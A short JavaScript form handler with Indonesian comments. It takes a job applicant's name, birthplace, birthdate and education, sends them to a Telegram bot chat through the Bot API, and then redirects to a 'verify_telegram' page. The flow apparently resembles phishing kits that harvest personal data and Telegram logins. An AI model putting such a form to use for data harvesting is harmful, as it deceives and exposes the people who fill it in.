document
  .getElementById("applicationForm")
  .addEventListener("submit", function (event) {
    event.preventDefault(); // Mencegah pengiriman form default

    // Mengambil data dari form
    const name = document.getElementById("name").value;
    const birthplace = document.getElementById("birthplace").value;
    const birthdate = document.getElementById("birthdate").value;
    const education = document.getElementById("education").value;

    // Mempersiapkan pesan untuk dikirim ke Telegram
    const message =
      `Lamaran Pekerjaan Baru:\n` +
      `Nama: ${name}\n` +
      `Tempat Lahir: ${birthplace}\n` +
      `Tanggal Lahir: ${birthdate}\n` +
      `Pendidikan Terakhir: ${education}`;

    // Ganti dengan token bot dan chat ID Anda
    const botToken = "YOUR_BOT_TOKEN";
    const chatId = "YOUR_CHAT_ID";

    // Mengirim data ke Telegram
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    })
      .then((response) => {
        if (response.ok) {
          // Pindahkan ke halaman verifikasi setelah sukses
          window.location.href = "verify_telegram.html";
        } else {
          alert("Terjadi kesalahan saat mengirim data. Silakan coba lagi.");
        }
      })
      .catch((error) => {
        console.error("Error:", error);
        alert("Terjadi kesalahan saat mengirim data. Silakan coba lagi.");
      });
  });
